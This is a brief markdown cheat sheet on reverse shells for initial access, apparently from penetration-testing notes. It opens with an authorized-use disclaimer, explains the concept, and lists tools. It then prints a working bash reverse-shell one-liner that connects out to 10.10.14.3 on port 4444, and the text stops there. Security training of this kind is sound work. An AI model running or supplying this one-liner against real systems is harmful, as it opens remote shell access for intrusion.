# 🎯 Reverse Shells (Initial Access)

> ⚠️ This document is for **educational and authorized testing environments only.** Do not use these techniques on systems without explicit permission.

---

## 🧠 What is a Reverse Shell?

A **reverse shell** allows a remote attacker to gain command-line access to a target machine. Instead of the attacker directly connecting to the target, the **target connects back** to the attacker’s system, evading inbound firewall rules.

---

## 🛠️ Common Payloads & Tools

| Tool            | Usage                          |
|-----------------|---------------------------------|
| `msfvenom`      | Create executable payloads      |
| `netcat`        | Basic listener/handler          |
| `ncat`          | Netcat with encryption support  |
| `powershell`    | Useful on Windows environments  |
| `bash`          | Works on Linux/Unix             |
| `python`        | Cross-platform reverse shell    |

---

## 🔧 Reverse Shell One-Liners

### 🐧 Bash (Linux)
```bash
bash -i >& /dev/tcp/10.10.14.3/4444 0>&1
